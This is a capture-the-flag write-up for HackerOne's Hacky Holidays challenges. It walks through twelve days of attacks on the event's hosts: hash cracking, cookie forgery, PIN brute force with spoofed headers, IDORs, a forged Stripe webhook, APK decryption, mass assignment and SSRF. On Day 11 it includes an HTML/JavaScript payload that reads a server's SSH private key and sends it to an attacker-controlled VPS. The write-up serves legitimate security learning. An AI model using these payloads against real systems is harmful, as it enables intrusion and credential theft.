Hacky Holidays Writeup: The notebook of the Grinch's Punisher
=====================
**DAY 1 - Finding the Grinch's Hidden Lair**
--------------------
1) As always we visit the h1-ctf program page [h1-ctf-program](https://hackerone.com/h1-ctf) and find the target of this CTF.
2) We visit https://hackyholidays.h1ctf.com and we notice that the first part for the CTF is hosted at [ELFMAIL](https://elfmail.hackyholidays.h1ctf.com/)
Seems some phishing attack has occurred and user credentials are being harvested by the Grinch.

3)  The login page that is presented will always return the same response Status code (200 OK) for any login attempt and the obfuscated JS code will return a message that the login is not currently working (it  a phishing campaign after all )
4) After fuzzing for various directories and parameters, we notice that the response code will be the same even if we remove all POST parameters send  by the login portal.
5) Once all parameters are removed we attempted to do another round of fuzzing with a different wordlist. To our surprise this time we discover a hidden parameter `debug` which will return a verbose error message, leaking system directories.

**Verbose error request:**
```http
POST /login-store HTTP/1.1
Host: elfmail.hackyholidays.h1ctf.com
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

debug=true
```
![remove-params-DEBUG](https://user-images.githubusercontent.com/55701068/151594075-11fb232d-6072-4ab6-ae7f-2b4ef5bce074.png)

6) We then attempt to use the leaked information to identify potential application directories/paths. Indeed the *_harvest_* is a directory which also has directory listing enabled.

![directory-listing-leaked-folder-name](https://user-images.githubusercontent.com/55701068/151594187-6cc68f08-b69b-42fd-8061-f29e2ad0e112.png)


Here we can also access flag.txt which stores the flag of day 1

![flag1](https://user-images.githubusercontent.com/55701068/151594416-44563a12-01dc-4ee7-a57f-7ed78273d659.png)

**DAY 2 - Salt instead of Sugar in the Christmas Sweets**
--------------------
1) The second day of the engagement presents to us an [Admin login panel](https://elfmail.hackyholidays.h1ctf.com/harvest-admin/) references in the phishing page.
2) We start with content discovery and we identify that a backup directory exists. Interestingly we identify that we get different size for the directories below by running the (dirsearch.txt wordlist)[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/dirsearch.txt]
This might be an insufficient attempt from the grinch to protect some sensitive files.

```
/backup/ -> 403 Forbidden
/Backup/ -> 200 OK
```
![backup-directory](https://user-images.githubusercontent.com/55701068/151594620-650d8ba6-ef74-4ccf-81af-a1f54a0d5ae7.png)

3) By visiting the [/Backup/](https://elfmail.hackyholidays.h1ctf.com/harvest-admin/Backup/) directory we discover a database file hosted there. Once downloaded we discover that the file stores usernames, password hashes and salts. However the file seems partially corrupted and the salt for the grinch's hash is not clear.

![db-downloaded](https://user-images.githubusercontent.com/55701068/151594652-c7314dd6-0e1f-4c13-bff7-6da103264b86.png)

4) Since those are MD5 hashed passwords, we can create a hash format and attempt to crack them with hashcat. For the first 2 users whose hashes we have we stored the following hashes in a file
```
5de402c02cbf657370d179808f26d450:564315833g
2309467bac72082e270195f5a43303d0:angelae
```
5) Then proceed with hashcat which will crack the hashes in a few seconds
**Hashcat Command**
```bash
hashcat -a 0 -m 10 hashes_day2.txt /usr/share/wordlists/rockyou.txt --force
```
**Cracked Passwords:**
```
bob:freedom
jim:austin
```
![hashcracking-1](https://user-images.githubusercontent.com/55701068/151594706-a87c313e-13d7-4cab-b624-3cfbb4e40940.png)

6) Attempting to login with those accounts, confirms what the db.sql file mentioned. They are both locked and cant login.
7) It is clear that we need to somehow obtain the password for the `grinch` account. Since we only have a partial part of the salt, we make an assumption that the grinch might have not learned from last year and still be using slightly week practices. We therefore attempt to identify potential candidates for the hash that match its pattern and that might exists in popular wordlists (yeah you guessed right, rockyou.txt)

```bash
Get potential salts that start with pare
> cat /usr/share/wordlists/rockyou.txt | grep '^pare' > salts.txt
Craft the list of the hashes to crack
> for i in $(cat salts.txt); do echo 0273f802f2882bcd5daf8f08a3fee512:$i >> hashes2_day2.txt; done
Crack the hashes
> hashcat -a 0 -m 10 hashes2_day2.txt /usr/share/wordlists/rockyou.txt --force
```
After a few minutes we get a successful hit which reveals that password is `amaflor2`
`0273f802f2882bcd5daf8f08a3fee512:pareh20:amaflor2` 

![hashcracking-1](https://user-images.githubusercontent.com/55701068/151594746-6c47177b-40c8-4fb9-ade2-a3b865584e97.png)

8) We can now attempt to login with those credentials
`grinch:amaflor2`
We get a valid login and we can obtain the second flag

![flag-day2](https://user-images.githubusercontent.com/55701068/151594852-14ba0faf-6fc6-4584-8f62-db9df85fd0ab.png)

**DAY 3 - What is more Evil that the grinch? - The sup3r-grinch**
--------------------
1) Third day starts where day 2 left us. Logged in as the grinch. A new directory exists under [data](https://elfmail.hackyholidays.h1ctf.com/harvest-admin/data/). However we get the message that our user does not have enough privileges
`This user does not have access to this feature`

![user-has-no-read-writes](https://user-images.githubusercontent.com/55701068/151595948-00896362-1469-4078-bd95-59927044fed9.png)

2) We proceed with directory enumeration in the background which reveals the following endpoints
```
https://elfmail.hackyholidays.h1ctf.com/harvest-admin/user  -> reveals user info, as also user role (indeed we are just assigned the `user` role
https://elfmail.hackyholidays.h1ctf.com/harvest-admin/api
https://elfmail.hackyholidays.h1ctf.com/harvest-admin/api/users
```
We keep note of them and proceed
3) We notice that the cookie assigned to our session is in JWT format

**Session Cookie Tampering**
`eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNkltZHlhVzVqYUNKOSIsImF1dGgiOiIwMjY5NjRhZmU1NDU2MzUxYzI1ZjI3MTIwM2YyNmE0MSJ9`

By decoding it we notice it has 2 parts
`{"data":"eyJ1c2VybmFtZSI6ImdyaW5jaCJ9","auth":"026964afe5456351c25f271203f26a41"}`
One seems to hold some data and the other seems like an MD5 which probably validates our session
Decoding the `data` section reveals that it hosts the current username
`{"username":"grinch"}`
This gives a potential attack vector, since if we can tamper with the `username` we might be able to authenticate as a different user.

However tampering with the username will not provided a valid session, which probably means the auth value is lined with the `username`
After various attempts to identify how the MD5 is generated (which all failed) we craft the following cookie
```
Forged Cookie
eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNkltZHlhVzVqYUNKOSIsImF1dGgiOnRydWV9Cg==
Decoded Cookie
{"data":"eyJ1c2VybmFtZSI6ImdyaW5jaCJ9","auth":true}
```
As you can notice we changed the `auth` value to `True` If the type of values the `auth` parameter can get has not been defined, we can pass this value and the auth check will always validate to True, allowing us to authenticate as any user we like.

To our surprise this indeed gives us a valid session. We can therefore try to login as the other users we knew from Day 2, hoping they have higher privileges
```
bod
jim
```

4) We forge a cookie for each user. 
```
Cookie forged as Bob:
eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNkltSnZZaUo5IiwiYXV0aCI6dHJ1ZX0=
```
The /user endpoint initially discovered, confirms that we now can access the application with another user. Although both users seem to have the `user` role. This means we need some other user that we currently do not know

![auth-as-bob](https://user-images.githubusercontent.com/55701068/151596108-5adf75f7-fa56-467f-a541-e6181d08a147.png)

5)  Since we also had discovered an /api endpoint, we expect that the username from the JWT is somehow interacting with that API (api/users). However the API endpoints do not allow direct access as the user is missing some sort of authentication
`{"error":"Authentication Required"}`

Given that we can forge any value in our cookie, we might be able to perform some sort of SSRF attack and make the application interact with the API.
To confirm this we forge the cookie below
```
Username:
{"username":"../"}
Decoded Cookie;
{"data":"eyJ1c2VybmFtZSI6Ii4uLyJ9","auth":true}
Final Cookie:
eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNklpNHVMeUo5IiwiYXV0aCI6dHJ1ZX0=
```
6) By setting the above cookie, we can confirm that we can traverse within the API. In the screenshot below you can observer the decoded body of the cookie used.

![api-traverse-via-cookie](https://user-images.githubusercontent.com/55701068/151596166-9f20b4fa-6cbb-45c8-a31c-1506898d7185.png)


7) Similarly to step 6 we set the username to `"../users"` which allows us to list all users of the application and reveals a new user `sup3r-grinch` with `admin` privileges
```
List users Cookie
eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNklpNHVMM1Z6WlhKekluMD0iLCJhdXRoIjp0cnVlfQ==
```

![list-user-by-forger-cookie](https://user-images.githubusercontent.com/55701068/151596291-2c2f0da8-0f11-43ec-ac69-d7297183d9aa.png)


8) We can now forge the final cookie and access the `data` section
```
Admin User Cookie:
eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNkluTjFjRE55TFdkeWFXNWphQ0o5IiwiYXV0aCI6dHJ1ZX0=
```

![super-admin-grinch](https://user-images.githubusercontent.com/55701068/151596318-4c17580e-ed0f-4089-b750-bf946a863ac2.png)

and grab the flag

![flag3](https://user-images.githubusercontent.com/55701068/151596418-05930ca6-02a6-4a9e-adce-a77ed9048f52.png)

**DAY 4 -  Christmas (PIN) Letters Stolen**
--------------------
1) Upon the 4th day of the grinch hunt. We now have the ability to delete the harvested credential that the Grinch has collected. Or maybe not? The grinch seems to have hardened this functionality and added a OTP that is send on his device and is required to complete the deletion of the records.
Besides not having access to the device with a number that ends to `485` there are two more problems.
- Our IP is blocked after 3 wrong attempts for a PIN
- The 2FA code with expire after some limited time

This does not allow us to directly bruteforce (or guess?) the PIN code.

2) A common way to bypass such restrictions is to make the server believe your requests come from a different IP. This is possible if there the server does not append or rewrite a header (such as `X-Forwarded-For` with your original IP.

Therefore by setting a header such as `X-Forwarded-For` and by rotating values we can make the server believe that our requests come from different hosts. Once the first problem is bypasses, it is a matter of speed and how fast we can go to be able to grab the 2FA code before it expires.

3) First we need to grab a challenge hash from the request below

```http
POST /harvest-admin/data/ HTTP/1.1
Host: elfmail.hackyholidays.h1ctf.com
Cookie: token=eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNkluTjFjRE55TFdkeWFXNWphQ0o5IiwiYXV0aCI6dHJ1ZX0=
Content-Length: 8
Content-Type: application/x-www-form-urlencoded
Connection: close

delete=1
```
Search in the response for `name="challenge"` and use that value in the ffuf command below

4) We can now use ffuf to bruteforce the PIN for the previously generated challenge
```bash
Generate all possible PINs
>  for i in {0000..9999}; do echo $i >> ~/Documents/HackerOne/hackyholidays\ 2021/pins.txt;done
Bruteforce the 2FA (change the hash code with a fresh one
> ffuf -u https://elfmail.hackyholidays.h1ctf.com/harvest-admin/data/ -X POST -H "Cookie: token=eyJkYXRhIjoiZXlKMWMyVnlibUZ0WlNJNkluTjFjRE55TFdkeWFXNWphQ0o5IiwiYXV0aCI6dHJ1ZX0=" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: 10.10.10.FUZZ" -d "delete=1&challenge=e6d3dc973c17b291248cb9e8185127f0&pin=FUZZ" -w ~/Documents/HackerOne/hackyholidays\ 2021/pins.txt -t 300 -x http://127.0.0.1:8080 --fs 2451
```
After some seconds ffuf will return the valid PIN

![ffuf](https://user-images.githubusercontent.com/55701068/151596547-7c20bab4-fd3e-4e4e-9ec3-4820a161ee8e.png)

And we can grab the flag

![flag-4](https://user-images.githubusercontent.com/55701068/151596633-75c7b803-e252-46b6-8c76-808fecc9b891.png)

**DAY 5 - Christmas Cookie Crumbles make a Flag**
--------------------
1) New day and a totally new target is in scope. We visit the [intranet domain](https://intranet.hackyholidays.h1ctf.com/) where the [Staff Info] (https://intranet.hackyholidays.h1ctf.com/staff_info/) challenge is enabled.
2) Visiting the new challenge page, we see Grinch's dog and some information about it. Like name,salary, date of birth etc. Checking burp, we notice that a handful of request has been send, each on of them pulling a different value. 
So we have the following 5 pieces of information retrieved
- Name
- Address
- Position
- Image
- Salary
- Dod (date of birth)

The request use an `id` parameter, which strongly indicate of a potential Access Control issue (IDOR).
3) We proceed with our tests against each URL

### Name
**Explanation:**Simple IDOR, changing the `id` value to `id=1` will give us the first flag
```
Request URL
`https://intranet.hackyholidays.h1ctf.com/staff_info/api/name?id=1
Response
"flag_part_1":"flag{c****"
```
### Address
**Explanation:** Initial request used the `c81e728d9d4c2f636f067f89cc14862c` hash which can be decoded easily and it is the MD5 hash for value `2`. We proceed with creating the hash for value `1` which is `c4ca4238a0b923820dcc509a6f75849b`
```
Request URL
https://intranet.hackyholidays.h1ctf.com/staff_info/api/address?id=c4ca4238a0b923820dcc509a6f75849b
Response
"flag_part_2":"1**-0"
```
### Position
**Explanation:** The request uses a base64 encoded value which decodes to `{"user_id":2}`. By changing the value to `{"user_id":1}` and encoding to base64 we can get the next part of the flag
```
Request URL
https://intranet.hackyholidays.h1ctf.com/staff_info/api/position?id=eyJ1c2VyX2lkIjoxfQ==
Response
"flag_part_3":"***-4a"
```
### Image
**Explanation:** The image endpoint does not use a parameter, but it seems to pull the image based on the Cookie set which is `Cookie: id=2`. By changing the value to `Cookie: id=1` we can get the next part of the flag
```http
GET /staff_info/api/image HTTP/1.1
Host: intranet.hackyholidays.h1ctf.com
Cookie: id=1

Response
"flag_part_4":"5c-****-**8"
```
### Salary
**Explanation:** In this case trying to swap the `id` value would return a message that we are not authorized to access that value `"error":"You do not have access to this resource`. It was possible though to do so by change the request verb to `PUT`
```http
PUT /staff_info/api/salary?id=1 HTTP/1.1
Host: intranet.hackyholidays.h1ctf.com

Response
"flag_part_5":"f****"
```
### Dob
**Explanation:** Similar as above chaning the `id` value would return a response for not having access to that resource. We idenfitied that a parameter pollution was possible
```http
GET /staff_info/api/dob?id=1&id=2 HTTP/1.1
Host: intranet.hackyholidays.h1ctf.com

Response
"flag_part_6":"***a}"
```
4) Putting all pieces together we get the finall flag for day5

**DAY 6 - Kiss Under the Mistletoe Costs 19.99$**
--------------------
1) A new application is in scope and it seems grinch is out there for some easy money via the [OnlyGrinch](https://intranet.hackyholidays.h1ctf.com/premium_content/) app
2) There is an option to create an account to buy the premium content of the grinch 

A lot was attempted at this point. Fuzzing for hours paths, parameters and values. As also creating emails with various payloads since we could include almost anything in the format.
`"<payload_here>"@test.com`
Nothing worked. 
3) After a lot of fuzzing (and by keeping an eye on the discord hacker101 group). It was noted that a specific wordlist was needed. I ended up getting a hit on a new endpoint via the`golang.txt` wordlist from `Seclists`.

![fuzzing-paths](https://user-images.githubusercontent.com/55701068/151596872-8286939e-778a-43bd-a563-ef01efbdc3a3.png)

Also within the application, the payment was handled via Stripe, which was probably a hint towards the `/webhook` endpoint.

4) Having now access to [webhook](https://intranet.hackyholidays.h1ctf.com/premium_content/webhook) we get a response such as `"error":"Missing Required Input"`.
Therefore we need to identify the proper request body to send.
5) We dive in the Stripe documentation and we identify the following page that is related to API requests for payments [The PaymentIntent object](https://stripe.com/docs/api/payment_intents/object)
We can now set up a request with the body presented below.
We need to change some values though:
- *receipt_email* : This will be the email linked to our account
- *amount* : Set it to the amount presented in the web application after authentication (19.99$)

```http
POST /premium_content/webhook HTTP/1.1
Host: intranet.hackyholidays.h1ctf.com
Cookie: og-token=f5ec3aa88cd9ae173b41614ee3bd7cc8
Content-Length: 472
Origin: https://intranet.hackyholidays.h1ctf.com
Content-Type: application/json

{ "id": "pi_1Dpddo2eZvKYlo2CYgGISnIa",  "object": "payment_intent", "amount": 1999,  "amount_capturable": 0,  "amount_received": 0,   "capture_method": "automatic",  "charges": {    "object": "list",    "data": [],    "has_more": false,    "url": "/v1/charges?payment_intent=pi_1Dpddo2eZvKYlo2CYgGISnIa"  },    "payment_method_types": [    "card"  ],  "receipt_email": "w31rd0@wearehackerone.com",   "status": "accepted"}
```

6) Issuing the request above this time will returns `"error":"Payment Failed"`. This is a new error message, meaning we are on the correct path, but we still need to adjust some options/parameters. So we go back to the documentation and we see the `status` parameter

From Stripe documentation
```
Status of this PaymentIntent, one of requires_payment_method, requires_confirmation, requires_action, processing, requires_capture, canceled, or succeeded. Read more about each PaymentIntent status.
```

7) We craft a new request with the `status` set to  `succeeded` as the following, which returns `"message":"Payment Received, account upgraded"`
```http
POST /premium_content/webhook HTTP/1.1
Host: intranet.hackyholidays.h1ctf.com
Cookie: og-token=f5ec3aa88cd9ae173b41614ee3bd7cc8
Content-Length: 421
Origin: https://intranet.hackyholidays.h1ctf.com
Content-Type: application/json

{ "id": "pi_1Dpddo2eZvKYlo2CYgGISnIa",  "object": "payment_intent", "amount": 1999,  "amount_capturable": 0,  "amount_received": 0,  "capture_method": "automatic",  "charges": {    "object": "list",    "data": [],    "has_more": false,    "url": "/v1/charges?payment_intent=pi_1Dpddo2eZvKYlo2CYgGISnIa"  },    "payment_method_types": [    "card"  ],  "receipt_email": "w31rd0@wearehackerone.com",   "status": "succeeded"}
```

![json-body-paid](https://user-images.githubusercontent.com/55701068/151597637-3a138304-e307-489b-80c5-a95194d3e46a.png)


8) We can now login with our account and get the premium grinch pictures along with the flag

![f;ag6](https://user-images.githubusercontent.com/55701068/151597763-55a57f4b-750e-4bd9-a8f0-aceaf58ad307.png)

**DAY 7 -Christmas List Hides a Gift**
--------------------
1) New day, new challenge. Today we need to download an Android named [christmaslist.apk](https://intranet.hackyholidays.h1ctf.com/apk_downloads/christmaslist.apk)
2) We install the .apk on our device and once we open it we see a request being sent to the intranet domain
```http
GET /api/christmasList?flag=false HTTP/1.1
Host: intranet.hackyholidays.h1ctf.com
Accept: application/json, text/plain, */*
Authorization: Bearer MjJlNzA1ZDY4OWZiYzE4MTk5Mjc2NzgwNDU2MGQ0YTYgIC0K
Accept-Encoding: gzip, deflate
User-Agent: okhttp/4.9.1
Connection: close
```
3) So the attack here is simple, change the `flag` parameter to `true` and here is your early Christmas present

![Screenshot from 2021-12-16 22-21-45](https://user-images.githubusercontent.com/55701068/151598016-78dc027a-a34a-4a5d-bcee-95623a2c36e5.png)

The code within the app responsible for this is below

![code-in-ak](https://user-images.githubusercontent.com/55701068/151597876-2f069091-c358-40c8-a32f-4405f9a6b4f0.png)

**DAY 8 - Grinch's Hidden Gifts**
--------------------
1) Day 8 and a new apk file awaits us [2FA App](https://intranet.hackyholidays.h1ctf.com/apk_downloads/grinch2fa.apk)
2) Downloading and installing the app on a device, shows that we need to provide a PIN to gain access to further functionalities.
3) We try to examine the applications code and convert the .apk to jar view the command below
```bash
./d2j-dex2jar.sh ~/Downloads/hackyholidays/grinch2fa.apk -o ~/Desktop/grinch.jar
```
4) We can then open and view the code with JD-Gui and go over the code. We can see a Login activity. 

![login-activity](https://user-images.githubusercontent.com/55701068/151598059-8a1aeae8-cb60-46be-97a6-e81903c03c7f.png)

The code is a bit obfuscated but we can see that it attempts to call an encryption function that uses `AES` from another part of the code.

![decrypt](https://user-images.githubusercontent.com/55701068/151658211-a9185c6d-765e-45e3-bb43-c693a80313ab.png)

5) From the Login activity we can see that probably it requires a 4 digits code to give us access, The PIN code will be repeated 4 times and used to decrypt the file. 
From within the `grinch2fa.apk` we can also obtain the encrypted database file `db.encrypted` by decompiling it
```bash
apktool d grinch2fa.apk
```
6)  Based on the information above we can make a loop iterating up to value `9999` and try to decrypt the file. Since this appears to be a sqlite database file we can identify it via its magic bytes. This will give us the OTP `2223` and by providing the code to the application we see that to `totp.db` file is created. We can read the database file and obtain its contents. the flag is base64 encoded

The script below can be run over the `db.encrypted` file and will return the correct PIN.

**Python script** (thanks to h3x0ne for assisting on this)
```python
#!/usr/bin/env python3

import itertools
from Crypto.Cipher import AES

n = []
for p in itertools.permutations(range(10),4):
    n.append(''.join(map(str, p)))


m =list(itertools.permutations([0,1,2,3,4,5,6,7,8,9], 4))
with open('db.encrypted', 'rb') as t:
  encdata = t.read()

for c in itertools.product(range(10), repeat=4):
  k = "%s" % ''.join(map(str, c))
  key = k*4
  cipher = AES.new(key, AES.MODE_ECB)

  decr = cipher.decrypt(encdata)
  with open('db.final', 'wb') as n:
    if (decr[0:4].hex() == "53514c69"):
      print(f'pin: {k}');
    n.close
```
Decrypted database file

![db](https://user-images.githubusercontent.com/55701068/151658257-db7f687a-7f33-45f7-9962-923e9c9ab713.png)

Flag decoded 

![flag8](https://user-images.githubusercontent.com/55701068/151658281-c90573f2-5bf2-426d-95ac-eb6536739bcb.png)

**DAY 9 - Joining the Christmas Party**
--------------------
1) Part 3 of the challenge starts and a new subdomain is in target, [C&C](https://c2.hackyholidays.h1ctf.com/)
2) We see a registration form, However when trying to register it appears that only specific domains are allowed.

![registration-not-allowed](https://user-images.githubusercontent.com/55701068/151598148-c709dbfe-0cc5-4ebb-9b6f-af5cea7ce5de.png)


3) While failing to register an account with a few domains, We proceed with further enumeration. Our directory bruteforce returns an endpoint that is relevant to this challenge.
```
https://c2.hackyholidays.h1ctf.com/p/
```

4) The endpoint, will require a POST parameter `email` and will return a response like  the one which can be seen below. This shows that we interact with some API and there are also various versions of it (we can see version 3 below)

![api-versioning](https://user-images.githubusercontent.com/55701068/151598257-4d89249e-1895-4542-b8e0-1fdff0b53267.png)

5) Based on the information above. We identify the following endpoint
`https://c2.hackyholidays.h1ctf.com/api/v3/`

Since we notice various version of the API have been created we check and see that 2 more previous version exist
```
https://c2.hackyholidays.h1ctf.com/api/v1/
https://c2.hackyholidays.h1ctf.com/api/v2/
```
The endpoints above reveal a few directories but its apparent that we have no access since `/users` and `/checkemail` return a `Not allowed` message

6) This hints that maybe some issue existed on previous versioning that might have been mitigated later on. After enumerating a bit more we identify that we can traverse back on other versions of the API via the request below

```http
POST /p/../v1/ HTTP/1.1
Host: c2.hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

email=test@test.com
```

This will allow us to submit request to the version 1 API endpoints.

7) So now we try to access the endpoints above. However again we receive `Not Allowed`, when trying to visit `/users`. Although if we try to go deeper we notice something different when trying to visit the endpoints below

```http
POST /p/../v1/users/1 HTTP/1.1
Host: c2.hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

email=test@test.com
```

The response returned is
```json
{"error":"User not found"}
```
So now we can actually enumerate users
8) We iterate through user IDs until we get to user ID `5`.
And we get a registered email with a unique domain
`graham.rinch@this.is.h1.101.h1ctf.com`

![email-domain](https://user-images.githubusercontent.com/55701068/151598416-f8e69fbd-79d7-4451-b3db-78c938e62273.png)

9) We now have a good idea what the allowed domain might be. We proceed and register an account with that domain

```http
POST /register/ HTTP/1.1
Host: c2.hackyholidays.h1ctf.com
Content-Length: 87
Content-Type: application/x-www-form-urlencoded

email=w31rd0%40this.is.h1.101.h1ctf.com&password=Password123!&c_password=Password123!
```
And we can grab the flag once we are authenticated in our newly  created account.

![flag9](https://user-images.githubusercontent.com/55701068/151598503-67a5aa63-6137-4e03-aed4-ea0f26347502.png)

**DAY 10 - How to Become The grinch (Ho-Ho-Ho)**
--------------------
1) Using our previously created account we notice a few new sections exist within the application. There is an `uploads` directory as also a `settings`.
2) We notice that our user permissions are `Read-Only` and it seems that we can change our `password`, but not our `role`.

![read](https://user-images.githubusercontent.com/55701068/151598546-33e28618-d150-4935-8c5b-29154172a215.png)

However we discover that even if we try to update out password, nothing happens. Similarly if we add the `role` parameter to our request, we stay with `Read-only` privileges. Since this endpoint seems to have no effect, we go back a bit.
3) We now create a new account and try to add a `role` parameter, just in case we can set our user role upon registration.
We send the request below

```http
POST /register/ HTTP/1.1
Host: c2.hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

email=w31rd0%2B1%40this.is.h1.101.h1ctf.com&password=Password1&c_password=Password1&role=admin
```

The account is created. Upon authenticating we can see that now we have the `admin` role.

![admin](https://user-images.githubusercontent.com/55701068/151598656-fb78a388-9526-4f2a-9918-050b165b4753.png)

4) We can navigate to [uploads](https://c2.hackyholidays.h1ctf.com/uploads/) and grab the 10th flag

![day 10](https://user-images.githubusercontent.com/55701068/151598731-846c693a-45ab-4490-930a-abafc40df998.png)

**DAY 11 - Hidden Presents in the North Pole**
--------------------
1) Day 11, and we notice the `/uploads` endpoints has an upload functionality, that allows only .html files to be uploaded
2) We proceed with a file that contains some tags that attempt to retrieve content from a host we control
```html
<html>
 <img src=http://VPS-IP:port/test1>
</html>
```
We notice once file is uploaded we receive a request from an IP we do not own `18.219.86.178`

![request-uploading](https://user-images.githubusercontent.com/55701068/151598813-fbb19957-3719-49af-b68c-8f33ab78dadb.png)

This means that some processing happens to our uploaded file. Trying to grab easy wins such as `document.cookie` will fail.

3) During previous day recon we have identified that a user's home directory endpoint exists but we get `403 Forbidden` when trying to visit it and common files it might hosts (e.g. `.ssh/id_rsa`).
https://c2.hackyholidays.h1ctf.com/~/
4) We try to uploaded the file below hoping that the IP that processes our uploads might be allowed to view those files.
```html
<!DOCTYPE html>
<html>
 <body>
  <iframe id="test" src="https://c2.hackyholidays.h1ctf.com/~/.ssh/id_rsa" width="1900" height="1900">
 </body>
</html>
```

Once uploaded we can indeed see that the file is rendered as a screenshot

![upload-](https://user-images.githubusercontent.com/55701068/151658394-0d7689ae-7c8a-4298-be20-96e81db6ef03.png)

5) Trying to obtain the entire file via css etc will work. However trying to extract the page contents via OCR will not be that helpful. We therefore attempt to send the file to our server. This was very problematic, cause we rarely received any request to our server, and the file size was probably way bigger than the allowed size of a payload for a `GET` parameter. We therefore tried to use the HTML code below, to split the send content.
We also had to put the upload request in a loop with some rate limiting cause we only received 2 out of 15 requests send
```html
<script>
fetch('https://c2.hackyholidays.h1ctf.com/~/.ssh/id_rsa')
    .then(response=>response.text())
    .then(text=>{
                 window.location.href='http://VPS/?key=' + encodeURIComponent(btoa(text.slice(0,500)))
            });
</script>
```
Slowly we were able to extract the `id_rsa` key. You can see below, partial parts of the key send as base64 encoded to avoid it breaking the request

![nase64-encoded-key](https://user-images.githubusercontent.com/55701068/151599014-24f17024-b058-43c9-9759-0c283dcd01aa.png)

6) We had to redo the process with different size of slicing, to confirm all characters where extracted properly and finally we ended up with the correct key.

7) We remember that during initial recon we also had found a github [config directory ](https://c2.hackyholidays.h1ctf.com/.git/config). Which hosted the content below
```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = https://github.com/grinch-networks-two/directory-protector
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```
So we have a github [repository](https://github.com/grinch-networks-two/directory-protector), which is however not accessible as also all other parts of that user profile.
Github can be set up to use ssh configuration, so the extracted key might be useful here.

8) Running the following commands can confirm access to the github repository and we can grab the flag
```bash
Configure key
> chmod 600 id_rsagrinch
Authenticate
> ssh -i id_rsagrinch gith@github.com
Get repository
> git clone git@github.com:grinch-networks-two/directory-protector
Get flag
> cat cat directory-protector/README.md 
```

![flag](https://user-images.githubusercontent.com/55701068/151599179-eaf1191e-7d8b-44c1-b3dc-9ced154fa44e.png)


**DAY 12 - Merry Fre*cking Christmas Grinch**
--------------------

1. After  day11  and based on the `README.md` content from that day. We download again the github repository to see for any update.
2. We notice that a file has been added, called `protector.php`
```php
<?php

class Protector
{

    public function __construct($codewords){
        $authorised = false;
        if( isset($_COOKIE["authorisation_token"]) ) {
            $token = $_COOKIE["authorisation_token"];
            $auth = json_decode(base64_decode($token), true);
            if (isset($auth["token"], $auth["server"])) {
                $authorisation_url = 'http://' . $auth["server"] . '.server.local/authenticate?token=' . $auth["token"];
                $response = json_decode(@file_get_contents($authorisation_url), true);
                if (isset($response["authorised"], $response["codeword"])) {
                    if ($response["authorised"] === true) {
                        if ($response["codeword"] === $this->expectedKeyword($codewords)) {
                            $authorised = true;
                        }
                    }
                }
            }
        }
        if( !$authorised ){
            http_response_code(403);
            die("Request Blocked using Directory Protector");
        }
    }
    private function expectedKeyword($codewords){
        $words = explode(PHP_EOL,file_get_contents($codewords));
        $line = intval(date("G")) + intval(date("i"));
        return $words[$line];
    }
}
```
Furthermore, the content of `README.md` has been update providing to us a new directory, which apparently is protected via the above PHP code.
**New directory**
```
### Something for you to check out ;)

/infrastructure_management
```
3. Analyzing the code above, we notice that we need a few things.
 a. To set a cookie named  *authorisation_token*
 b. That cookie has to be base64 encoded and the encoded value has to be JSON format and include 2 values:
```     
 - token
 - server
```
 c. We also notice that the server value will be inserted in the URL below and create an endpoint that will attempt to communicating with a subdomain of the `server.local` network
 `http://' . $auth["server"] . '.server.local/authenticateAnalysing`
Since we can control the `server` parameter we can inject a value that will send the traffic to a server we control. This can be done by using a cookie like the one below
```
{"token":"test","server":"VPS:8000/\/?test="}
```
Once inserted into the URL above the `server.local` part will be considered as a parameter and the host used to send the HTTP request will be the VPS's IP on port 8000
d. In order for the `authorised` value to be set to `true` we also need the server to respond with a JSON response that will include 2 values
  - "authorised" set to true
  - "codeword" set to a specific value that is pulled from a list of key words. The correct value is derived based on the server time and will be generated by the code below
```php
        $words = explode(PHP_EOL,file_get_contents($codewords));
        $line = intval(date("G")) + intval(date("i"));
        return $words[$line];
```
The list of potential candidate keywords can be found within the flowing [code.txt list](https://c2.hackyholidays.h1ctf.com/infrastructure_management/code.txt) that can be found on the server.

Based on the information above we need to craft an attack that:
 1. Will inject our server as the `server` value in our cookie.
 2. Our server should return a response that will include `"authorised":true` and also the correct keyword based on the server's time.

To do this, we host the following PHP code on our server
```php
<?php
function expectedKeyword($codewords){
        $words = explode(PHP_EOL,file_get_contents($codewords));
        $line = intval(date("G")) + intval(date("i"));
        return $words[$line];
    }
echo "{\"authorised\":true,\"codeword\":\"".expectedKeyword('code.txt')."\"}";
```
Then we server the code like
```bash
php -S 0.0.0.0:8000 code.php
```
And craft the following cookie
```
Cookie:
> authorisation_token=eyJ0b2tlbiI6InczMXJkMCIsInNlcnZlciI6IjE3Mi4xMDUuWFguWFg6ODAwMC9cLz90ZXN0PSJ9
Decoded Cookie
> {"token":"w31rd0","server":"172.105.XX.XX:8000/\/?test="}
```
4. We send the request and notice that we get a hit on our server

![request-recevied](https://user-images.githubusercontent.com/55701068/151602285-e9ef6795-6690-4c74-91a1-94c05914abc2.png)

Our server will respond with the JSON response needed to get authorised

![response](https://user-images.githubusercontent.com/55701068/151602319-3ecdd42a-ac18-4f27-ba2d-8d38bc036569.png)

We notice that we can now view the protected page

![bypass-protector](https://user-images.githubusercontent.com/55701068/151602365-657e9659-bfab-4984-ad03-d0a3bcd9793c.png)


